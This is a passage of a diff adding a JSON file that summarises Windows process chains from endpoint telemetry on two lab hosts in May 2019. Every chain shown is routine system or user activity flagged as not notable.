+   "process_terminate": 1
+  },
+  "narrative": "services.exe => sppsvc.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "C:\\Windows\\system32\\sppsvc.exe"
+  ]
+ },
+ {
+  "chain_id": "CH-0147",
+  "host": "HR001",
+  "user": "SHIRE\\nmartha",
+  "root_process": "mstsc.exe",
+  "root_parent": "explorer.exe",
+  "start": "2019-05-14 23:42:00.723000+00:00",
+  "end": "2019-05-14 23:47:01.035000+00:00",
+  "duration_s": 300.3,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 294,
+  "events_by_type": {
+   "registry_event": 165,
+   "image_load": 119,
+   "file_create": 4,
+   "process_access": 3,
+   "pipe_event": 2,
+   "process_create": 1
+  },
+  "narrative": "explorer.exe => mstsc.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "\"C:\\Windows\\system32\\mstsc.exe\" "
+  ]
+ },
+ {
+  "chain_id": "CH-0148",
+  "host": "HR001",
+  "user": "SHIRE\\nmartha",
+  "root_process": "backgroundtaskhost.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 23:42:03.285000+00:00",
+  "end": "2019-05-14 23:43:04.531000+00:00",
+  "duration_s": 61.2,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 114,
+  "events_by_type": {
+   "image_load": 89,
+   "registry_event": 23,
+   "process_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "svchost.exe => backgroundtaskhost.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "\"C:\\Windows\\system32\\backgroundTaskHost.exe\" -ServerName:CortanaUI.AppXy7vb4pc2dr3kc93kfc509b1d0arkfb2x.mca"
+  ]
+ },
+ {
+  "chain_id": "CH-0149",
+  "host": "HR001",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "svchost.exe",
+  "root_parent": "services.exe",
+  "start": "2019-05-14 23:42:03.770000+00:00",
+  "end": "2019-05-14 23:47:04.308000+00:00",
+  "duration_s": 300.5,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 90,
+  "events_by_type": {
+   "process_access": 51,
+   "image_load": 37,
+   "process_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "services.exe => svchost.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "C:\\Windows\\system32\\svchost.exe -k appmodel -p -s camsvc"
+  ]
+ },
+ {
+  "chain_id": "CH-0150",
+  "host": "HR001",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "searchprotocolhost.exe",
+  "root_parent": "searchindexer.exe",
+  "start": "2019-05-14 23:42:04.550000+00:00",
+  "end": "2019-05-14 23:43:41.668000+00:00",
+  "duration_s": 97.1,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 48,
+  "events_by_type": {
+   "image_load": 42,
+   "registry_event": 4,
+   "process_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "searchindexer.exe => searchprotocolhost.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "\"C:\\Windows\\system32\\SearchProtocolHost.exe\" Global\\UsGthrFltPipeMssGthrPipe31_ Global\\UsGthrCtrlFltPipeMssGthrPipe31 1 -2147483646 \"Software\\Microsoft\\Windows Search\" \"Mozilla/4.0 (compatible; MSIE 6"
+  ]
+ },
+ {
+  "chain_id": "CH-0151",
+  "host": "HR001",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "searchfilterhost.exe",
+  "root_parent": "searchindexer.exe",
+  "start": "2019-05-14 23:42:04.719000+00:00",
+  "end": "2019-05-14 23:43:41.675000+00:00",
+  "duration_s": 97.0,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 25,
+  "events_by_type": {
+   "image_load": 23,
+   "process_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "searchindexer.exe => searchfilterhost.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "\"C:\\Windows\\system32\\SearchFilterHost.exe\" 0 768 772 780 8192 776 "
+  ]
+ },
+ {
+  "chain_id": "CH-0152",
+  "host": "HR001",
+  "user": "SHIRE\\nmartha",
+  "root_process": "credentialuibroker.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 23:42:37.654000+00:00",
+  "end": "2019-05-14 23:43:02.355000+00:00",
+  "duration_s": 24.7,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 156,
+  "events_by_type": {
+   "image_load": 127,
+   "registry_event": 15,
+   "other": 8,
+   "process_access": 4,
+   "process_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "svchost.exe => credentialuibroker.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "\"C:\\Windows\\System32\\CredentialUIBroker.exe\" NonAppContainerFailedMip -Embedding"
+  ]
+ },
+ {
+  "chain_id": "CH-0153",
+  "host": "HR001",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "taskhostw.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 23:42:46.761000+00:00",
+  "end": "2019-05-14 23:42:47.165000+00:00",
+  "duration_s": 0.4,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 37,
+  "events_by_type": {
+   "image_load": 32,
+   "registry_event": 3,
+   "process_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "svchost.exe => taskhostw.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "taskhostw.exe NGCKeyPregen"
+  ]
+ },
+ {
+  "chain_id": "CH-0154",
+  "host": "HR001",
+  "user": "SHIRE\\nmartha",
+  "root_process": "backgroundtaskhost.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 23:42:46.801000+00:00",
+  "end": "2019-05-14 23:43:49.273000+00:00",
+  "duration_s": 62.5,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 71,
+  "events_by_type": {
+   "image_load": 67,
+   "registry_event": 2,
+   "process_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "svchost.exe => backgroundtaskhost.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "\"C:\\Windows\\system32\\backgroundTaskHost.exe\" -ServerName:App.AppXemn3t55segp7q92mwd35v2a5rk5mvwyz.mca"
+  ]
+ },
+ {
+  "chain_id": "CH-0155",
+  "host": "HR001",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "svchost.exe",
+  "root_parent": "services.exe",
+  "start": "2019-05-14 23:42:46.833000+00:00",
+  "end": "2019-05-14 23:42:47.035000+00:00",
+  "duration_s": 0.2,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 26,
+  "events_by_type": {
+   "image_load": 24,
+   "process_create": 1,
+   "file_create": 1
+  },
+  "narrative": "services.exe => svchost.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "C:\\Windows\\System32\\svchost.exe -k wsappx -p -s ClipSVC"
+  ]
+ },
+ {
+  "chain_id": "CH-0156",
+  "host": "HR001",
+  "user": "SHIRE\\nmartha",
+  "root_process": "runtimebroker.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 23:42:48.077000+00:00",
+  "end": "2019-05-14 23:44:19.273000+00:00",
+  "duration_s": 91.2,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 151,
+  "events_by_type": {
+   "process_access": 83,
+   "image_load": 52,
+   "registry_event": 6,
+   "file_create": 5,
+   "other": 2,
+   "process_create": 1,
+   "pipe_event": 1,
+   "process_terminate": 1
+  },
+  "narrative": "svchost.exe => runtimebroker.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "C:\\Windows\\System32\\RuntimeBroker.exe -Embedding"
+  ]
+ },
+ {
+  "chain_id": "CH-0157",
+  "host": "HFDC01",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "smss.exe",
+  "root_parent": "smss.exe",
+  "start": "2019-05-14 23:43:04.779000+00:00",
+  "end": "2019-05-14 23:43:04.841000+00:00",
+  "duration_s": 0.1,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 13,
+  "events_by_type": {
+   "registry_event": 8,
+   "image_load": 2,
+   "process_access": 2,
+   "process_create": 1
+  },
+  "narrative": "smss.exe => smss.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "\\SystemRoot\\System32\\smss.exe 000000ec 0000007c "
+  ]
+ },
+ {
+  "chain_id": "CH-0158",
+  "host": "HFDC01",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "csrss.exe",
+  "root_parent": "smss.exe",
+  "start": "2019-05-14 23:43:04.802000+00:00",
+  "end": "2019-05-14 23:45:46.020000+00:00",
+  "duration_s": 161.2,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 49,
+  "events_by_type": {
+   "process_access": 26,
+   "image_load": 15,
+   "registry_event": 7,
+   "process_create": 1
+  },
+  "narrative": "smss.exe => csrss.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "%%SystemRoot%%\\system32\\csrss.exe ObjectDirectory=\\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sx"
+  ]
+ },
+ {
+  "chain_id": "CH-0159",
+  "host": "HFDC01",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "winlogon.exe",
+  "root_parent": "smss.exe",
+  "start": "2019-05-14 23:43:04.840000+00:00",
+  "end": "2019-05-14 23:44:25.592000+00:00",
+  "duration_s": 80.8,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 109,
+  "events_by_type": {
+   "registry_event": 64,
+   "image_load": 39,
+   "process_access": 5,
+   "process_create": 1
+  },
+  "narrative": "smss.exe => winlogon.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "winlogon.exe"
+  ]
+ },
+ {
+  "chain_id": "CH-0160",
+  "host": "HFDC01",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "logonui.exe",
+  "root_parent": "winlogon.exe",
+  "start": "2019-05-14 23:43:07.185000+00:00",
+  "end": "2019-05-14 23:43:16.049000+00:00",
+  "duration_s": 8.9,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 224,
+  "events_by_type": {
+   "image_load": 113,
+   "registry_event": 109,
+   "process_create": 1,
+   "process_access": 1
+  },
+  "narrative": "winlogon.exe => logonui.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "\"LogonUI.exe\" /flags:0x0 /state0:0xa2dcd055 /state1:0x41c64e6d"
+  ]
+ },
+ {
+  "chain_id": "CH-0161",
+  "host": "HFDC01",
+  "user": "Window Manager\\DWM-3",
+  "root_process": "dwm.exe",
+  "root_parent": "winlogon.exe",
+  "start": "2019-05-14 23:43:07.523000+00:00",
+  "end": "2019-05-14 23:43:08.134000+00:00",
+  "duration_s": 0.6,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 57,
+  "events_by_type": {
+   "image_load": 55,
+   "process_create": 1,
+   "registry_event": 1
+  },
+  "narrative": "winlogon.exe => dwm.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "\"dwm.exe\""
+  ]
+ },
+ {
+  "chain_id": "CH-0162",
+  "host": "HFDC01",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "dllhost.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 23:43:11.237000+00:00",
+  "end": "2019-05-14 23:43:12.504000+00:00",
+  "duration_s": 1.3,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 23,
+  "events_by_type": {
+   "image_load": 20,
+   "registry_event": 2,
+   "process_create": 1
+  },
+  "narrative": "svchost.exe => dllhost.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "C:\\Windows\\system32\\DllHost.exe /Processid:{E10F6C3A-F1AE-4ADC-AA9D-2FE65525666E}"
+  ]
+ },
+ {
+  "chain_id": "CH-0163",
+  "host": "HFDC01",
+  "user": "SHIRE\\pgustavo",
+  "root_process": "tstheme.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 23:43:12.010000+00:00",
+  "end": "2019-05-14 23:43:12.130000+00:00",
+  "duration_s": 0.1,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 57,
+  "events_by_type": {
+   "image_load": 30,
+   "registry_event": 26,
+   "process_create": 1
+  },
+  "narrative": "svchost.exe => tstheme.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "C:\\Windows\\system32\\TSTheme.exe -Embedding"
+  ]
+ },
+ {
+  "chain_id": "CH-0164",
+  "host": "HFDC01",
+  "user": "SHIRE\\pgustavo",
+  "root_process": "rdpclip.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 23:43:12.173000+00:00",
+  "end": "2019-05-14 23:43:13.483000+00:00",
+  "duration_s": 1.3,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 44,
+  "events_by_type": {
+   "image_load": 43,
+   "process_create": 1
+  },
+  "narrative": "svchost.exe => rdpclip.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "rdpclip"
+  ]
+ },
+ {
+  "chain_id": "CH-0165",
+  "host": "HFDC01",
+  "user": "SHIRE\\pgustavo",
+  "root_process": "runtimebroker.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 23:43:12.550000+00:00",
+  "end": "2019-05-14 23:43:30.372000+00:00",
+  "duration_s": 17.8,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 38,
+  "events_by_type": {
+   "image_load": 28,
+   "registry_event": 5,
+   "process_access": 4,
+   "process_create": 1
+  },
+  "narrative": "svchost.exe => runtimebroker.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "C:\\Windows\\System32\\RuntimeBroker.exe -Embedding"
+  ]
+ },
+ {
+  "chain_id": "CH-0166",
+  "host": "HFDC01",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "trustedinstaller.exe",
+  "root_parent": "services.exe",
+  "start": "2019-05-14 23:43:12.827000+00:00",
+  "end": "2019-05-14 23:47:10.147000+00:00",
+  "duration_s": 237.3,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 27,
+  "events_by_type": {
+   "image_load": 23,
+   "registry_event": 2,
+   "process_create": 1,
+   "process_access": 1
+  },
+  "narrative": "services.exe => trustedinstaller.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "C:\\Windows\\servicing\\TrustedInstaller.exe"
+  ]
+ },
+ {
+  "chain_id": "CH-0167",
+  "host": "HFDC01",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "tiworker.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 23:43:13.464000+00:00",
+  "end": "2019-05-14 23:47:10.109000+00:00",
+  "duration_s": 236.6,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 93,
+  "events_by_type": {
+   "registry_event": 50,
+   "image_load": 35,
+   "process_access": 7,
+   "process_create": 1
+  },
+  "narrative": "svchost.exe => tiworker.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "C:\\Windows\\winsxs\\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.14393.693_none_42ff55c9655f38bf\\TiWorker.exe -Embedding"
+  ]
+ },
+ {
+  "chain_id": "CH-0168",
+  "host": "HFDC01",
+  "user": "SHIRE\\pgustavo",
+  "root_process": "svchost.exe",
+  "root_parent": "services.exe",
+  "start": "2019-05-14 23:43:13.924000+00:00",
+  "end": "2019-05-14 23:45:18.698000+00:00",
+  "duration_s": 124.8,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 88,
+  "events_by_type": {
+   "image_load": 87,
+   "process_create": 1
+  },
+  "narrative": "services.exe => svchost.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "C:\\Windows\\system32\\svchost.exe -k UnistackSvcGroup"
+  ]
+ },
+ {
+  "chain_id": "CH-0169",
+  "host": "HFDC01",
+  "user": "SHIRE\\pgustavo",
+  "root_process": "sihost.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 23:43:13.930000+00:00",
+  "end": "2019-05-14 23:46:04.645000+00:00",
+  "duration_s": 170.7,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 344,
+  "events_by_type": {
+   "registry_event": 247,
+   "image_load": 69,
+   "process_access": 27,
+   "process_create": 1
+  },
+  "narrative": "svchost.exe => sihost.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "sihost.exe"
+  ]
+ },
+ {
+  "chain_id": "CH-0170",
+  "host": "HFDC01",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "xblgamesavetask.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 23:43:14.858000+00:00",
+  "end": "2019-05-14 23:43:41.465000+00:00",
+  "duration_s": 26.6,
+  "n_processes": 2,
+  "max_depth": 1,
+  "n_events": 38,
+  "events_by_type": {
+   "image_load": 34,
+   "process_create": 2,
+   "process_access": 1,
+   "registry_event": 1
+  },
+  "narrative": "svchost.exe => xblgamesavetask.exe -> conhost.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "C:\\Windows\\System32\\XblGameSaveTask.exe logon",
+   "\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1"
+  ]
+ },
+ {
+  "chain_id": "CH-0171",
+  "host": "HFDC01",
+  "user": "SHIRE\\pgustavo",
+  "root_process": "taskhostw.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 23:43:15.109000+00:00",
+  "end": "2019-05-14 23:44:18.334000+00:00",
+  "duration_s": 63.2,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 60,
+  "events_by_type": {
+   "image_load": 47,
+   "registry_event": 12,
+   "process_create": 1
+  },
+  "narrative": "svchost.exe => taskhostw.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "taskhostw.exe {222A245B-E637-4AE9-A93F-A59CA119A75E}"
+  ]
+ },
+ {
+  "chain_id": "CH-0172",
+  "host": "HFDC01",
+  "user": "SHIRE\\pgustavo",
+  "root_process": "servermanagerlauncher.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 23:43:15.139000+00:00",
+  "end": "2019-05-14 23:44:13.520000+00:00",
+  "duration_s": 58.4,
+  "n_processes": 3,
+  "max_depth": 1,
+  "n_events": 175,
+  "events_by_type": {
+   "image_load": 138,
+   "registry_event": 24,
+   "file_create": 9,
+   "process_create": 3,
+   "process_access": 1
+  },
+  "narrative": "svchost.exe => servermanagerlauncher.exe -> servermanager.exe (x2)",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "C:\\Windows\\system32\\ServerManagerLauncher.exe",
+   "\"C:\\Windows\\system32\\ServerManager.exe\" ",
+   "\"C:\\Windows\\system32\\ServerManager.exe\" "
+  ]
+ },
+ {
+  "chain_id": "CH-0173",
+  "host": "HFDC01",
+  "user": "SHIRE\\pgustavo",
+  "root_process": "taskhostw.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 23:43:15.409000+00:00",
+  "end": "2019-05-14 23:43:43.826000+00:00",
+  "duration_s": 28.4,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 45,
+  "events_by_type": {
+   "image_load": 33,
+   "registry_event": 10,
+   "process_create": 1,
+   "pipe_event": 1
+  },
+  "narrative": "svchost.exe => taskhostw.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "taskhostw.exe USER"
+  ]
+ },
+ {
+  "chain_id": "CH-0174",
+  "host": "HFDC01",
+  "user": "SHIRE\\pgustavo",
+  "root_process": "userinit.exe",
+  "root_parent": "winlogon.exe",
+  "start": "2019-05-14 23:43:28.175000+00:00",
+  "end": "2019-05-14 23:44:10.532000+00:00",
+  "duration_s": 42.4,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 33,
+  "events_by_type": {
+   "image_load": 24,
+   "registry_event": 7,
+   "process_create": 1,
+   "process_access": 1
+  },
+  "narrative": "winlogon.exe => userinit.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "C:\\Windows\\system32\\userinit.exe"
+  ]
+ },
+ {
+  "chain_id": "CH-0175",
+  "host": "HFDC01",
+  "user": "SHIRE\\pgustavo",
+  "root_process": "explorer.exe",
+  "root_parent": "userinit.exe",
+  "start": "2019-05-14 23:43:28.495000+00:00",
+  "end": "2019-05-14 23:47:30.300000+00:00",
+  "duration_s": 241.8,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 666,
+  "events_by_type": {
+   "registry_event": 295,
+   "image_load": 198,
+   "process_access": 163,
+   "file_create": 5,
+   "pipe_event": 3,
+   "process_create": 1,
+   "network_connect": 1
+  },
+  "narrative": "userinit.exe => explorer.exe",
+  "network_endpoints": [
+   "52.242.210.82:443 x1"
+  ],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "C:\\Windows\\Explorer.EXE"
+  ]
+ },
+ {
+  "chain_id": "CH-0176",
+  "host": "HFDC01",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "taskhostw.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 23:43:30.006000+00:00",
+  "end": "2019-05-14 23:44:12.667000+00:00",
+  "duration_s": 42.7,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 29,
+  "events_by_type": {
+   "image_load": 28,
+   "process_create": 1
+  },
+  "narrative": "svchost.exe => taskhostw.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "taskhostw.exe"
+  ]
+ },
+ {
+  "chain_id": "CH-0177",
+  "host": "HFDC01",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "googlecrashhandler.exe",
+  "root_parent": "googleupdate.exe",
+  "start": "2019-05-14 23:43:47.430000+00:00",
+  "end": "2019-05-14 23:44:00.254000+00:00",
+  "duration_s": 12.8,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 41,
+  "events_by_type": {
+   "image_load": 40,
+   "process_create": 1
+  },
+  "narrative": "googleupdate.exe => googlecrashhandler.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "\"C:\\Program Files (x86)\\Google\\Update\\1.3.34.7\\GoogleCrashHandler.exe\""
+  ]
+ },
+ {
+  "chain_id": "CH-0178",
+  "host": "HFDC01",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "googlecrashhandler64.exe",
+  "root_parent": "googleupdate.exe",
+  "start": "2019-05-14 23:43:47.431000+00:00",
+  "end": "2019-05-14 23:43:59.723000+00:00",
+  "duration_s": 12.3,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 32,
+  "events_by_type": {
+   "image_load": 31,
+   "process_create": 1
+  },
+  "narrative": "googleupdate.exe => googlecrashhandler64.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "\"C:\\Program Files (x86)\\Google\\Update\\1.3.34.7\\GoogleCrashHandler64.exe\""
+  ]
+ },
+ {
+  "chain_id": "CH-0179",
+  "host": "HFDC01",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "consent.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 23:43:53.216000+00:00",
+  "end": "2019-05-14 23:44:03.586000+00:00",
+  "duration_s": 10.4,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 209,
+  "events_by_type": {
+   "registry_event": 157,
+   "image_load": 50,
+   "process_create": 1,
+   "process_access": 1
+  },
+  "narrative": "svchost.exe => consent.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "consent.exe 720 348 0000025524042F60"
+  ]
+ },
+ {
+  "chain_id": "CH-0180",
+  "host": "HFDC01",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "dllhost.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 23:44:00.316000+00:00",
+  "end": "2019-05-14 23:44:02.394000+00:00",
+  "duration_s": 2.1,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 24,
+  "events_by_type": {
+   "image_load": 22,
+   "process_create": 1,
+   "registry_event": 1
+  },
+  "narrative": "svchost.exe => dllhost.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "C:\\Windows\\system32\\DllHost.exe /Processid:{E10F6C3A-F1AE-4ADC-AA9D-2FE65525666E}"
+  ]
+ },
+ {
+  "chain_id": "CH-0181",
+  "host": "HFDC01",
+  "user": "SHIRE\\pgustavo",
+  "root_process": "shellexperiencehost.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 23:44:01.724000+00:00",
+  "end": "2019-05-14 23:44:18.449000+00:00",
+  "duration_s": 16.7,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 103,
+  "events_by_type": {
+   "image_load": 96,
+   "registry_event": 5,
+   "process_create": 1,
+   "pipe_event": 1
+  },
+  "narrative": "svchost.exe => shellexperiencehost.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "\"C:\\Windows\\SystemApps\\ShellExperienceHost_cw5n1h2txyewy\\ShellExperienceHost.exe\" -ServerName:App.AppXtk181tbxbce2qsex02s8tw7hfxa9xb3t.mca"
+  ]
+ },
+ {
+  "chain_id": "CH-0182",
+  "host": "HFDC01",
+  "user": "SHIRE\\pgustavo",
+  "root_process": "runtimebroker.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 23:44:02.409000+00:00",
+  "end": "2019-05-14 23:44:26.101000+00:00",
+  "duration_s": 23.7,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 392,
+  "events_by_type": {
+   "process_access": 314,
+   "image_load": 74,
+   "pipe_event": 2,
+   "process_create": 1,
+   "registry_event": 1
+  },
+  "narrative": "svchost.exe => runtimebroker.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "C:\\Windows\\System32\\RuntimeBroker.exe -Embedding"
+  ]
+ },
+ {
+  "chain_id": "CH-0183",
+  "host": "HFDC01",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "dllhost.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 23:44:03.656000+00:00",
+  "end": "2019-05-14 23:44:03.919000+00:00",
+  "duration_s": 0.3,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 22,
+  "events_by_type": {
+   "image_load": 20,
+   "process_create": 1,
+   "registry_event": 1
+  },
+  "narrative": "svchost.exe => dllhost.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "C:\\Windows\\system32\\DllHost.exe /Processid:{E10F6C3A-F1AE-4ADC-AA9D-2FE65525666E}"
+  ]
+ },
+ {
+  "chain_id": "CH-0184",
+  "host": "HFDC01",
+  "user": "SHIRE\\pgustavo",
+  "root_process": "searchui.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 23:44:09.306000+00:00",
+  "end": "2019-05-14 23:44:21.309000+00:00",
+  "duration_s": 12.0,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 134,
+  "events_by_type": {
+   "image_load": 113,
+   "registry_event": 20,
+   "process_create": 1
+  },
+  "narrative": "svchost.exe => searchui.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "\"C:\\Windows\\SystemApps\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\SearchUI.exe\" -ServerName:CortanaUI.AppXa50dqqa5gqv4a428c9y1jjw7m3btvepj.mca"
+  ]
+ },
+ {
+  "chain_id": "CH-0185",
+  "host": "HFDC01",
+  "user": "NT AUTHORITY\\LOCAL SERVICE",
+  "root_process": "wmiprvse.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 23:44:13.867000+00:00",
+  "end": "2019-05-14 23:44:14.635000+00:00",
+  "duration_s": 0.8,
+  "n_processes": 1,
